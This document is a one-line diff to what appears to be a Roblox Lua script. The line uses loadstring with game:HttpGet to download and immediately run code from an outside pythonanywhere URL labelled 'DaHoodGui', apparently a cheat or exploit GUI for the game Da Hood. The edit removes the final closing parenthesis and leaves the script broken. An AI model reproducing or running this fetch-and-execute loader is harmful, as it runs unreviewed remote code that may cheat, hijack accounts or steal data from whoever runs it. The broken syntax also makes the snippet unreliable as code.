@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://peeky.pythonanywhere.com/DaHoodGui"))()
+loadstring(game:HttpGet("https://peeky.pythonanywhere.com/DaHoodGui"))(
